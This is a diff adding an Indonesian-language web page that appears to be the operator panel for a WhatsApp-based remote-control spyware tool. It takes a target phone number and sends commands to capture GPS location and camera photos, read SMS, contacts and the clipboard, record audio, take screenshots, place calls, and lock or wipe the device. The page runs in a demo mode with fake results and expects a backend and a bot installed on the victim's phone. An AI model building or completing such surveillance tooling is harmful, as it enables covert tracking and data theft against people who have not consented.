@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Remote Control - Panel Gelap</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000000; color: #00ff41; font-family: 'Courier New', monospace; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { max-width: 1100px; width: 100%; background: #0a0a0a; border: 2px solid #00ff41; border-radius: 10px; padding: 25px; box-shadow: 0 0 20px #00ff41; }
+        h1 { text-align: center; font-size: 26px; letter-spacing: 2px; text-shadow: 0 0 5px #00ff41; margin-bottom: 10px; }
+        .sub { text-align: center; font-size: 12px; color: #00aa33; margin-bottom: 20px; border-bottom: 1px dashed #00ff41; padding-bottom: 8px; }
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input, textarea, select { width: 100%; background: #111; color: #00ff41; border: 1px solid #00ff41; padding: 10px; font-family: monospace; font-size: 14px; border-radius: 4px; }
+        textarea { resize: vertical; }
+        .cmd-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; margin: 20px 0; }
+        .cmd-btn { background: #0a0a0a; color: #00ff41; border: 1px solid #00ff41; padding: 10px; text-align: center; cursor: pointer; border-radius: 4px; transition: 0.2s; font-size: 13px; }
+        .cmd-btn:hover { background: #00ff41; color: #000; box-shadow: 0 0 8px #00ff41; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px 20px; font-weight: bold; cursor: pointer; border-radius: 4px; margin-right: 10px; font-size: 14px; }
+        button:hover { background: #00cc33; box-shadow: 0 0 10px #00ff41; }
+        .btn-danger { background: #ff4400; color: #fff; }
+        .btn-danger:hover { background: #cc3300; }
+        .result-box { background: #050505; border: 1px solid #00ff41; border-radius: 4px; padding: 15px; margin-top: 20px; min-height: 250px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; white-space: pre-wrap; }
+        .status { margin-top: 10px; font-size: 11px; color: #ffaa00; text-align: center; }
+        .warning { color: #ff4444; font-size: 11px; text-align: center; margin-top: 15px; border-top: 1px solid #333; padding-top: 10px; }
+        .flex-buttons { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📱 WHATSAPP REMOTE CONTROL 📱</h1>
+    <div class="sub">KONTROL HP JARAK JAUH VIA NOMOR WA | DARK MODE</div>
+    
+    <div class="input-group">
+        <label>🎯 NOMOR TARGET (WA aktif):</label>
+        <input type="text" id="target" placeholder="Contoh: 628123456789" value="628123456789">
+    </div>
+    
+    <div class="input-group">
+        <label>⚡ PERINTAH:</label>
+        <textarea id="command" rows="3" placeholder="loc | cam_front | cam_rear | sms | call 081234 | wifilist | screenshot | record 15 | lock | wipe"></textarea>
+    </div>
+    
+    <div class="cmd-grid">
+        <div class="cmd-btn" onclick="setCmd('loc')">📍 GPS Lokasi</div>
+        <div class="cmd-btn" onclick="setCmd('cam_front')">📷 Kamera Depan</div>
+        <div class="cmd-btn" onclick="setCmd('cam_rear')">📸 Kamera Belakang</div>
+        <div class="cmd-btn" onclick="setCmd('sms list')">📨 Daftar SMS</div>
+        <div class="cmd-btn" onclick="setCmd('call 08123456789')">📞 Panggil Nomor</div>
+        <div class="cmd-btn" onclick="setCmd('wifilist')">📶 Daftar WiFi</div>
+        <div class="cmd-btn" onclick="setCmd('screenshot')">🖥️ Screenshot</div>
+        <div class="cmd-btn" onclick="setCmd('record 10')">🎙️ Rekam Suara 10s</div>
+        <div class="cmd-btn" onclick="setCmd('record 30')">🎙️ Rekam Suara 30s</div>
+        <div class="cmd-btn" onclick="setCmd('lock')">🔒 Kunci Layar</div>
+        <div class="cmd-btn" onclick="setCmd('alert Halo')">⚠️ Kirim Alert</div>
+        <div class="cmd-btn" onclick="setCmd('clipboard')">📋 Baca Clipboard</div>
+        <div class="cmd-btn" onclick="setCmd('contacts')">📇 Daftar Kontak</div>
+        <div class="cmd-btn" onclick="setCmd('battery')">🔋 Status Baterai</div>
+    </div>
+    
+    <div class="flex-buttons">
+        <button onclick="sendCommand()">📤 KIRIM PERINTAH</button>
+        <button onclick="fetchResult()">📥 AMBIL HASIL</button>
+        <button class="btn-danger" onclick="clearResult()">🗑️ HAPUS HASIL</button>
+    </div>
+    
+    <div class="result-box" id="result">
+        [•] Menunggu perintah...<br>
+        [•] Masukkan nomor target dan perintah.<br>
+        [•] Klik Kirim Perintah untuk mengirim via WhatsApp Gateway.
+    </div>
+    <div class="status" id="status">🟢 SIAP | Mode: DARK | Gateway: Fonnte (demo)</div>
+    <div class="warning">
+        ⚠️ CATATAN: Web ini hanya FRONTEND. Untuk berfungsi penuh, backend API harus berjalan.<br>
+        🔧 BACKEND diperlukan: Flask + Fonnte token atau gunakan langsung API WhatsApp Business.<br>
+        💡 Mode DEMO: Simulasi pengiriman perintah (tidak benar-benar mengirim WA).
+    </div>
+</div>
+
+<script>
+    // =============== KONFIGURASI ===============
+    // Ganti dengan URL backend jika ada. Biarkan kosong untuk mode DEMO.
+    const BACKEND_URL = "";  // Contoh: "http://localhost:5000"
+    const DEMO_MODE = true;   // Jika true, hanya simulasi di console
+    
+    // =============== FUNGSI UTAMA ===============
+    function setCmd(cmd) {
+        document.getElementById('command').value = cmd;
+        updateStatus("Perintah diset: " + cmd);
+    }
+    
+    function updateStatus(msg) {
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerHTML = "🟡 " + msg;
+        setTimeout(() => {
+            if(document.getElementById('status').innerHTML.includes(msg))
+                document.getElementById('status').innerHTML = "🟢 SIAP";
+        }, 2000);
+    }
+    
+    function clearResult() {
+        document.getElementById('result').innerHTML = "[•] Hasil dibersihkan.\n[•] Kirim perintah baru.";
+        updateStatus("Hasil dihapus");
+    }
+    
+    async function sendCommand() {
+        const target = document.getElementById('target').value.trim();
+        const command = document.getElementById('command').value.trim();
+        
+        if(!target) {
+            alert("❌ Masukkan nomor target (contoh: 628123456789)");
+            return;
+        }
+        if(!command) {
+            alert("❌ Masukkan perintah");
+            return;
+        }
+        
+        // Validasi nomor (minimal 10 digit)
+        if(!/^62[0-9]{8,15}$/.test(target) && !/^08[0-9]{8,14}$/.test(target)) {
+            alert("⚠️ Nomor harus format Indonesia: 628xxxx atau 08xxxx");
+            return;
+        }
+        
+        document.getElementById('result').innerHTML = "⏳ Mengirim perintah ke " + target + "...\nPerintah: " + command;
+        updateStatus("Mengirim...");
+        
+        if(DEMO_MODE || !BACKEND_URL) {
+            // Mode demo: simpan ke localStorage
+            console.log(`[DEMO] Mengirim WA ke ${target}: ${command}`);
+            const fakeResponse = {
+                status: true,
+                message: `Perintah "${command}" dikirim ke ${target} (DEMO MODE)`,
+                timestamp: new Date().toISOString()
+            };
+            localStorage.setItem('wa_last_command_' + target, JSON.stringify(fakeResponse));
+            setTimeout(() => {
+                document.getElementById('result').innerHTML = `✅ [DEMO] ${fakeResponse.message}\n\n📌 Catatan: Ini hanya simulasi. Untuk kirim WA asli, backend API diperlukan.\n\nDetail:\nTarget: ${target}\nPerintah: ${command}\nWaktu: ${fakeResponse.timestamp}`;
+                updateStatus("Terkirim (demo)");
+            }, 500);
+            return;
+        }
+        
+        // Mode nyata dengan backend
+        try {
+            const response = await fetch(BACKEND_URL + '/send_wa', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target: target, command: command })
+            });
+            const data = await response.json();
+            if(response.ok) {
+                document.getElementById('result').innerHTML = `✅ Berhasil:\n${JSON.stringify(data, null, 2)}`;
+                updateStatus("Perintah terkirim");
+            } else {
+                document.getElementById('result').innerHTML = `❌ Gagal:\n${data.error || data.message || 'Unknown error'}`;
+                updateStatus("Gagal kirim");
+            }
+        } catch(e) {
+            document.getElementById('result').innerHTML = `❌ ERROR: ${e.message}\nPastikan backend berjalan di ${BACKEND_URL}`;
+            updateStatus("Error koneksi");
+        }
+    }
+    
+    async function fetchResult() {
+        const target = document.getElementById('target').value.trim();
+        if(!target) {
+            alert("Masukkan nomor target terlebih dahulu");
+            return;
+        }
+        
+        document.getElementById('result').innerHTML = "⏳ Mengambil hasil dari " + target + "...";
+        
+        if(DEMO_MODE || !BACKEND_URL) {
+            // Demo: generate hasil palsu berdasarkan perintah terakhir
+            const lastCommand = document.getElementById('command').value.trim();
+            let demoResult = {};
+            
+            if(lastCommand.includes('loc')) demoResult = { lokasi: "-6.2088, 106.8456 (Jakarta)", akurasi: "15 meter" };
+            else if(lastCommand.includes('cam_front')) demoResult = { gambar: "base64_encoded_image_simulasi", pesan: "Foto kamera depan (demo)" };
+            else if(lastCommand.includes('sms')) demoResult = { sms: ["Dari Bank: Saldo Rp 5.000.000", "Promo Indomaret hari ini"] };
+            else if(lastCommand.includes('wifilist')) demoResult = { wifi: [{ssid:"Wifi_01", signal:-45}, {ssid:"IndiHome", signal:-67}] };
+            else if(lastCommand.includes('battery')) demoResult = { level: 73, status: "Charging", suhu: "32°C" };
+            else demoResult = { pesan: "Hasil simulasi. Tidak ada perintah yang cocok.", perintah_terakhir: lastCommand };
+            
+            setTimeout(() => {
+                document.getElementById('result').innerHTML = `📡 HASIL DEMO (${target}):\n\n${JSON.stringify(demoResult, null, 2)}\n\n⚠️ Ini data palsu. Hasil nyata hanya tersedia jika bot WA terpasang di HP target dan backend API aktif.`;
+                updateStatus("Demo result loaded");
+            }, 300);
+            return;
+        }
+        
+        // Mode nyata
+        try {
+            const response = await fetch(BACKEND_URL + '/get_result?target=' + encodeURIComponent(target));
+            const data = await response.json();
+            document.getElementById('result').innerHTML = JSON.stringify(data, null, 2);
+            updateStatus("Hasil diambil");
+        } catch(e) {
+            document.getElementById('result').innerHTML = `❌ Error: ${e.message}`;
+            updateStatus("Gagal ambil hasil");
+        }
+    }
+    
+    // Inisialisasi: cek apakah localStorage punya data tersimpan
+    function loadLastTarget() {
+        const last = localStorage.getItem('wa_last_target');
+        if(last) document.getElementById('target').value = last;
+    }
+    function saveTarget() {
+        const target = document.getElementById('target').value;
+        if(target) localStorage.setItem('wa_last_target', target);
+    }
+    document.getElementById('target').addEventListener('change', saveTarget);
+    loadLastTarget();
+    
+    // Tambahkan contoh perintah cepat
+    console.log("WhatsApp Remote Panel siap. Mode DEMO = " + DEMO_MODE);
+</script>
+</body>
+</html>
